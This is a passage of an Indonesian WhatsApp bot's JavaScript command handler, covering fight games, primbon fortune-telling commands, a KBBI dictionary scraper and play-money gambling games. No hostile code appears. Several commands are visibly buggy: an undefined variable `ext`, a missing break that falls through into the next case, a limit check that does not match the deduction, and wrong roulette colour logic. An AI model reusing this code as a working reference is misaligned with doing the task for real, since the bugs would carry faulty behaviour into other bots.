        if (userAction === 'serang' && lawanAction === 'bertahan') {
            userScore++;
            result += `🤜 ${pilihan} menyerang dan berhasil mengalahkan taktik bertahan ${lawanPilihan}! (+1 poin)\n`;
        } else if (userAction === 'bertahan' && lawanAction === 'serang') {
            lawanScore++;
            result += `🤜 ${lawanPilihan} menyerang dan mengalahkan taktik bertahan ${pilihan}! (+1 poin)\n`;
        } else {
            result += `🤝 Kedua pahlawan sama-sama menerapkan taktik yang sama, ${pilihan} dan ${lawanPilihan}.\n`;
        }

        // Variasi aksi tambahan
        if (userScore - lawanScore >= 2) {
            result += `💥 ${pilihan} terluka dan masuk rumah sakit!\n`;
        } else if (lawanScore - userScore >= 2) {
            result += `💥 ${lawanPilihan} terluka dan masuk rumah sakit!\n`;
        }

        if (userScore >= 5) {
            result += `😢 ${pilihan} menangis dan merasa tertekan.\n`;
        } else if (lawanScore >= 5) {
            result += `😢 ${lawanPilihan} menangis dan merasa tertekan.\n`;
        }

        if (userScore <= 1) {
            result += `🗣️ ${lawanPilihan} ngadu bapak awoakwoak!\n`;
        } else if (lawanScore <= 1) {
            result += `🗣️ ${pilihan} ngadu bapak awkoakwo!\n`;
        }

        round++;
    }
    result += `\n⏱️ Pertandingan selesai! Total skor: ${pilihan} ${userScore} - ${lawanPilihan} ${lawanScore}`;

    if (userScore > lawanScore) {
        result += `\n🎉 ${pilihan} memenangkan permainan adu pahlawan melawan ${lawanPilihan}!`;
    } else if (lawanScore > userScore) {
        result += `\n😢 ${pilihan} kalah dalam permainan adu pahlawan melawan ${lawanPilihan}!`;
    } else {
        result += `\n⚖️ Pertandingan adu pahlawan melawan ${lawanPilihan} berakhir imbang!`;
    }

    await m.reply(`${result}`);
}
break;
case 'adusemut': {
    const pilihanSemut = ['hitam', 'merah'];
    const pilihan = args[0]?.toLowerCase();

    if (!pilihan) {
        return await m.reply(`Pilihan semut yang tersedia: ${pilihanSemut.join(', ')}`);
    }

    if (!pilihanSemut.includes(pilihan)) {
        return await m.reply('Pilihan semut tidak valid. Pilihan yang tersedia: ' + pilihanSemut.join(', '));
    }

    let userScore = 0;
    let botScore = 0;
    let maxRounds = 10; // Jumlah ronde maksimal
    let round = 1;
    let result = `🐜 Mulai permainan adu semut dengan pilihan ${pilihan} 🐜\n\n`;

    while (round <= maxRounds) {
        let userAction = Math.random() < 0.5 ? 'menyerang' : 'menangkis';
        let botAction = Math.random() < 0.5 ? 'menyerang' : 'menangkis';

        if (userAction === 'menyerang' && botAction === 'menangkis') {
            userScore++;
            result += `🤜 Anda ${pilihan} menyerang dan berhasil mengalahkan semut lawan! (+1 poin)\n`;
        } else if (userAction === 'menangkis' && botAction === 'menyerang') {
            botScore++;
            result += '🤜 Lawan berhasil menangkis dan berhasil mengalahkan semut Anda! (+1 poin)\n';
        } else {
            result += '🤝 Kedua semut sama-sama menangkis serangan.\n';
        }

        round++;
    }

    result += `\n⏱️ Pertandingan selesai! Total skor: Anda ${userScore} - Lawan ${botScore}`;

    if (userScore > botScore) {
        result += `\n🎉 Anda memenangkan permainan adu semut dengan pilihan ${pilihan}!`;
    } else if (botScore > userScore) {
        result += `\n😢 Anda kalah dalam permainan adu semut dengan pilihan ${pilihan}!`;
    } else {
        result += `\n⚖️ Pertandingan adu semut dengan pilihan ${pilihan} berakhir imbang!`;
    }

    await m.reply(`${result}`);
}
break;

// ...

            case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
              case 'restart':
                if (!isCreator) return m.reply(mess.owner)
                m.reply('Proses....')
                exec('reset')
                break
            case 'ramalancinta': case 'ramalcinta': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            
                case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
               if (!text) throw `Example : ${prefix + command} 7, 7, 2004`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}`, m)
            }
            case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'mancing': {
    const peluangMancing = Math.random();

    if (peluangMancing < 0.3) {
        const ikanDitangkap = ['ikan kecil', 'ikan sedang', 'ikan besar'];
        const hasilMancing = ikanDitangkap[Math.floor(Math.random() * ikanDitangkap.length)];
        let hasil = `🎣 Kamu berhasil menangkap ${hasilMancing}!\n`;

        const peluangJual = Math.random();
        let penjualan = 0;

        if (peluangJual < 0.3) {
            penjualan = Math.floor(Math.random() * 20) + 10; // Jumlah uang dari penjualan
            hasil += `💰 Kamu menjual ${hasilMancing} dan mendapatkan ${penjualan} koin!`;
        } else {
            hasil += `😔 Sayangnya, kamu tidak bisa menjual ikan ini. Mungkin lain kali.`;
        }

        await m.reply(hasil);
    } else {
        await m.reply('🎣 Kamu mencoba untuk mancing, tetapi tidak berhasil kali ini. Coba lagi nanti!');
    }
}
break;
            
            case 'memancing': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                sky.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'hitungkata': {
  if (!args[0]) throw 'Gunakan: *hitungkata [teks]*';

  const kata = args.join(' ');
  const jumlahKata = kata.split(/\s+/).filter(word => word.length > 0).length;

  await sky.sendText(from, `Jumlah kata dalam teks tersebut adalah: ${jumlahKata}`);
  break;
}
case 'hitunghuruf': {
  if (!args[0]) throw 'Gunakan: *hitunghuruf [teks]*';

  const teks = args.join(' ');
  const jumlahHuruf = teks.replace(/\s+/g, '').length;

  await sky.sendText(from, `Teks : ${teks}\nmengandung ${jumlahHuruf} huruf.`);
  break;
}

case 'kbbi': {
 if (!text) throw 'Masukkan kata yang ingin dicari di KBBI.'; // Mengecek apakah text ada

 const axios = require('axios');
 const cheerio = require('cheerio');

 const kbbi = async (query) => {
 return new Promise((resolve, reject) => {
 const url = 'https://kbbi.web.id/';
 axios.get(url + query).then(res => {
 const $ = cheerio.load(res.data);
 const arti = $('div#d1').text().trim();
 resolve(arti);
 }).catch(reject);
 });
 };

 kbbi(text)
 .then(arti => {
 if (!arti) {
 m.reply('Kata tidak ditemukan di KBBI.');
 } else {
 m.reply(`Arti kata "${text}":\n${arti}`);
 }
 })
 .catch(error => {
 m.reply('Terjadi kesalahan saat mengambil data dari KBBI.');
 console.error(error);
 });
}
break
case 'dicegame': {
  if (args.length < 2) {
    return m.reply('Penggunaan: *dicegame [tebakan (1-6)] [jumlah taruhan]*');
    }
    const userGuess = parseInt(args[0]); // Tebakan pengguna (1-6)
    const betAmount = parseInt(args[1]); // Jumlah taruhan
    const userBalance = db.data.users[m.sender].balance; // Saldo pengguna

    if (betAmount <= 0 || betAmount > userBalance) {
        return m.reply('Taruhan tidak valid atau saldo tidak mencukupi.');
    }

    const diceResult = Math.floor(Math.random() * 6) + 1; // Hasil lemparan dadu

    let result = '';
    if (userGuess === diceResult) {
        const winAmount = betAmount * 6; // Pengguna memenangkan enam kali taruhan
        db.data.users[m.sender].balance += winAmount;
        result = `Hasil: Kamu menang! (+${winAmount} balance)\nHasil dadu: ${diceResult}`;
    } else {
        db.data.users[m.sender].balance -= betAmount;
        result = `Hasil: Kamu kalah! (-${betAmount} balance)\nHasil dadu: ${diceResult}`;
    }

    m.reply(result);
}
break
case 'coinflip': {
  if (args.length < 2) {
    return m.reply('Penggunaan: *coinflip [heads/tails] [jumlah taruhan]*');
  }

    const userChoice = args[0].toLowerCase(); // Pilihan pengguna: 'heads' atau 'tails'
    const betAmount = parseInt(args[1]); // Jumlah taruhan
    const userBalance = db.data.users[m.sender].balance; // Saldo pengguna

    if (betAmount <= 0 || betAmount > userBalance) {
        return m.reply('Taruhan tidak valid atau saldo tidak mencukupi.');
    }

    const botChoice = Math.random() < 0.5 ? 'heads' : 'tails'; // Pilihan bot secara acak

    let result = '';
    if (userChoice === botChoice) {
        const winAmount = betAmount * 2; // Pengguna memenangkan dua kali taruhan
        db.data.users[m.sender].balance += winAmount;
        result = `Hasil: Kamu menang! (+${winAmount} balance)\nBot memilih: ${botChoice}`;
    } else {
        db.data.users[m.sender].balance -= betAmount;
        result = `Hasil: Kamu kalah! (-${betAmount} balance)\nBot memilih: ${botChoice}`;
    }

    m.reply(result);
}
break;
case 'tembakburung': {
     if (!isPremium && global.db.data.users[m.sender].limit < 10) return m.reply(mess.endLimit) // respon ketika limit habis
    db.data.users[m.sender].limit -= 20 // -1 limit
  const birds = ['🦜', '🦢', '🦃', '🦚', '🦩'];
  let shotBird = null;
  while (!shotBird) {
    const randomIndex = Math.floor(Math.random() * birds.length);
    shotBird = birds.splice(randomIndex, 1)[0];
  }
  m.reply(`Kamu menembak burung ${shotBird}!`);
  if (shotBird === '🦃') { 
    const prize = 100000;
    db.data.users[m.sender].balance += prize; // tambahkan
    m.reply(`SELAMAT! Kamu menembak burung langka 🦃 dan mendapatkan hadiah Rp${prize}!`);
  } else if (shotBird === '🦚') {
    const prize = 50000; 
    db.data.users[m.sender].balance += prize; // tambahkan
    m.reply(`Wah kamu beruntung menembak burung 🦚 dan mendapatkan Rp${prize}!`);
  } else {
    m.reply('Burung biasa, coba lagi ya!');
  }
}
break;
    case 'blackjack':
    {
        let userBet = parseInt(args[0]); // Jumlah taruhan dari pengguna

        if (isNaN(userBet)) {
            throw new Error('Format yang benar: blackjack <jumlah taruhan>');
        }

        let userHand = drawCard() + drawCard();
        let dealerHand = drawCard() + drawCard();

        let resultText = `Tangan Anda: ${userHand}\nTangan Dealer: ${dealerHand}\n`;

        let userScore = calculateScore(userHand);
        let dealerScore = calculateScore(dealerHand);

        if (userScore === 21) {
            resultText += 'Blackjack! Anda menang.\n';
            userBet *= 2.5; // Blackjack memberikan 2.5 kali taruhan
        } else if (userScore > 21) {
            resultText += 'Bust! Anda kalah.\n';
            userBet = 0;
        } else if (userScore < dealerScore || dealerScore === 21) {
            resultText += 'Dealer menang.\n';
            userBet = 0;
        } else if (userScore > dealerScore) {
            resultText += 'Anda menang!\n';
            userBet *= 2;
        } else {
            resultText += 'Hasil seri.\n';
        }

        // Gantilah kode ini dengan pengelolaan saldo yang sesuai
        // Misalnya, jika Anda menggunakan database, Anda perlu mengubah saldo pengguna dalam database.
        let userBalance = 1000;
        userBalance += userBet;

        resultText += `Saldo Anda sekarang: ${userBalance}.`;

        m.reply(resultText);
        }
    break;

    case 'slotmachine':
    {
        let userBet = parseInt(args[0]); // Jumlah taruhan dari pengguna

        if (isNaN(userBet)) {
            throw new Error('Format yang benar: slotmachine <jumlah taruhan>');
        }

        let symbols = ['🍒', '🍊', '🍋', '🍇', '🍓', '🍉', '🍌', '🍍', '🍎'];
        let slotResults = [];
        
        for (let i = 0; i < 3; i++) {
            let randomIndex = Math.floor(Math.random() * symbols.length);
            slotResults.push(symbols[randomIndex]);
        }

        let resultText = `Hasil mesin slot: ${slotResults.join(' ')}\n`;

        let isWin = new Set(slotResults).size === 1;

        if (isWin) {
            userBet *= 5; // Jika kombinasi simbol sama, pengguna memenangkan 5 kali taruhan
            resultText += `Selamat! Anda menang dan memenangkan ${userBet}.\n`;
        } else {
            resultText += 'Sayang sekali, Anda kalah.\n';
        }

        // Gantilah kode ini dengan pengelolaan saldo yang sesuai
        // Misalnya, jika Anda menggunakan database, Anda perlu mengubah saldo pengguna dalam database.
        let userBalance = 1000;
        userBalance += isWin ? userBet : -userBet;

        resultText += `Saldo Anda sekarang: ${userBalance}.`;

        m.reply(resultText);
    }
    break;
case 'dicegamble':
    {
        let userBet = parseInt(args[0]); // Jumlah taruhan dari pengguna
        let userGuess = parseInt(args[1]); // Tebakan angka dari pengguna

        if (isNaN(userBet) || isNaN(userGuess) || userGuess < 1 || userGuess > 6) {
            throw new Error('Format yang benar: dicegamble <taruhan> <tebakan angka 1-6>');
        }

        let diceResult = Math.floor(Math.random() * 6) + 1; // Hasil lempar dadu dari 1 hingga 6

        let resultText = `Hasil lempar dadu: ${diceResult}\n`;

        if (userGuess === diceResult) {
            userBet *= 5; // Jika tebakan benar, pengguna memenangkan 5 kali taruhan
            resultText += `Selamat! Anda benar dan memenangkan ${userBet}.\n`;
        } else {
            resultText += 'Sayang sekali, Anda salah.\n';
        }

        // Gantilah kode ini dengan pengelolaan saldo yang sesuai
        // Misalnya, jika Anda menggunakan database, Anda perlu mengubah saldo pengguna dalam database.
        let userBalance = 1000;
        userBalance += userBet;

        resultText += `Saldo Anda sekarang: ${userBalance}.`;

        m.reply(resultText);
    }
    break;
    
    case 'roulette':
    {
        let userBet = args[0]; // Taruhan pengguna ("red", "black", "even", "odd")
        let userAmount = parseInt(args[1]); // Jumlah taruhan

        if (!userBet || !userAmount || isNaN(userAmount)) {
            throw new Error('Format yang benar: roulette <red/black/even/odd> <jumlah taruhan>');
        }

        let rouletteResult = Math.floor(Math.random() * 37); // Hasil roulette dari 0 hingga 36

        let resultText = `Hasil roulette: ${rouletteResult}\n`;

        if (rouletteResult === 0) {
            resultText += 'Tidak ada pemenang, bola jatuh pada angka 0.';
        } else {
            let isRed = (rouletteResult % 2 === 0 && rouletteResult <= 10) || (rouletteResult % 2 === 1 && rouletteResult >= 11);
            let isEven = rouletteResult % 2 === 0;

            if ((userBet === 'red' && isRed) ||
                (userBet === 'black' && !isRed) ||
                (userBet === 'even' && isEven) ||
                (userBet === 'odd' && !isEven)) {
                userAmount *= 2; // Jika tebakan benar, pengguna memenangkan taruhan dua kali lipat
                resultText += `Selamat! Anda menang dan memenangkan ${userAmount}.\n`;
            } else {
                userAmount = 0; // Jika tebakan salah, pengguna kalah dan saldo diatur menjadi 0
                resultText += 'Sayang sekali, Anda kalah.\n';
            }
        }

        // Gantilah kode ini dengan pengelolaan saldo yang sesuai
        // Misalnya, jika Anda menggunakan database, Anda perlu mengubah saldo pengguna dalam database.
        let userBalance = 1000;
        userBalance += userAmount;

        resultText += `Saldo Anda sekarang: ${userBalance}.`;

        m.reply(resultText);
    }
    break;

case 'pick': {
  if (!isGroup) throw mess.group;
  if (!args[0] || !args[1]) throw `Gunakan: *${prefix}pick [jumlah pemenang] [daftar peserta dipisah koma]*`;

  let jumlahPemenang = parseInt(args[0]);
  let daftarPeserta = args[1].split(',');

  if (isNaN(jumlahPemenang)) throw 'Jumlah pemenang harus berupa angka.';
  if (jumlahPemenang <= 0) throw 'Jumlah pemenang harus lebih dari 0.';
  if (daftarPeserta.length < jumlahPemenang) throw 'Jumlah peserta kurang dari jumlah pemenang yang diminta.';

  let pemenang = [];
  for (let i = 0; i < jumlahPemenang; i++) {
    let randomIndex = Math.floor(Math.random() * daftarPeserta.length);
    let pesertaTerpilih = daftarPeserta.splice(randomIndex, 1)[0];
    pemenang.push(pesertaTerpilih);
  }

  let message = `Pemenang terpilih:\n`;
  for (let i = 0; i < pemenang.length; i++) {
    message += `${i + 1}. ${pemenang[i]}\n`;
  }

  m.reply(message);
  }
  break;

  case 'cekprovider':{
  if (!isAdmins) throw mess.admin
  if (!args[0]) throw `Gunakan: *${prefix}cekprovider [nomor ponsel]*`;
  const nomorPonsel = args[0];
  const nomorTanpaAwalan = nomorPonsel.replace(/^\+62/, '0'); // Mengganti awalan +62 menjadi 0

  let provider = 'Tidak Dikenal';
  if (nomorTanpaAwalan.startsWith('0817') || nomorTanpaAwalan.startsWith('0818') || nomorTanpaAwalan.startsWith('0819')) {
    provider = 'XL';
  } else if (nomorTanpaAwalan.startsWith('0838') || nomorTanpaAwalan.startsWith('0831')) {
    provider = 'Axis';
  } else if (nomorTanpaAwalan.startsWith('0896') || nomorTanpaAwalan.startsWith('0897') || nomorTanpaAwalan.startsWith('0898')) {
    provider = 'Three';
  } else if (nomorTanpaAwalan.startsWith('0814') || nomorTanpaAwalan.startsWith('0815') || nomorTanpaAwalan.startsWith('0816')) {
    provider = 'Indosat';
